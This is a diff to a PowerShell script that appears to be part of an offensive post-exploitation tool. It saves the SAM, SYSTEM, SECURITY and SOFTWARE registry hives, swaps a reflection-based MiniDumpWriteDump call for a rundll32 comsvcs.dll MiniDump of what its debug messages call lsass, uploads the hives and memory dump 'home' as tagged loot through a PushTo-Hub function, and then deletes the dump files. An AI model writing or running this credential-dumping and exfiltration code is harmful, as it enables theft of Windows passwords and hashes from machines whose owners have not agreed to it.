@@ -628,36 +628,26 @@ Partially based on:
     $ProcessId = $Process.Id
     $ProcessName = $Process.Name
     $ProcessHandle = $Process.Handle
-    $ProcessFileName = "$($ProcessName)_$($ProcessId).dmp"
+    $ProcessFileName = "$($ProcessName)_$($ProcessId)_$($LootId).dmp"
     $ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName
 
-    $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
-    $WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
-    $Flags = [Reflection.BindingFlags] 'NonPublic, Static'
-    $MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)
-    $MiniDumpWithFullMemory = [UInt32] 2
-
     try {
+        {{'Write-Debug "Dumping Hives..."'|debug}}
         & reg save HKLM\SAM $SamPath /y
         & reg save HKLM\SYSTEM $SystemPath /y
         & reg save HKLM\SECURITY $SecurityPath /y
         & reg save HKLM\SOFTWARE $SoftwarePath /y
 
-        $FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)
-        $Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,
-                                                     $ProcessId,
-                                                     $FileStream.SafeFileHandle,
-                                                     $MiniDumpWithFullMemory,
-                                                     [IntPtr]::Zero,
-                                                     [IntPtr]::Zero,
-                                                     [IntPtr]::Zero))
-        $FileStream.Close()
-
+        {{'Write-Debug "Dumping lsass to $ProcessDumpPath..."'|debug}}
+        & rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $ProcessId $ProcessDumpPath full
+        {{'Write-Debug "Dumping sysinfo..."'|debug}}
         $SysInfo | PushTo-Hub -Name "sysinfo" -LootId $LootId
+        {{'Write-Debug "Sending dumps home..."'|debug}}
         Foreach ($f in $SamPath, $SystemPath, $SecurityPath, $SoftwarePath, $ProcessDumpPath) {
             if (Test-Path $f) { PushTo-Hub -LootId $LootId $f }
         }
     } finally {
+        {{'Write-Debug "Deleting dumps..."'|debug}}
         Foreach ($f in $ProcessDumpPath, $SamPath, $SystemPath, $SecurityPath, $SoftwarePath) {
             try { Remove-Item -Force $f} catch {}
         }
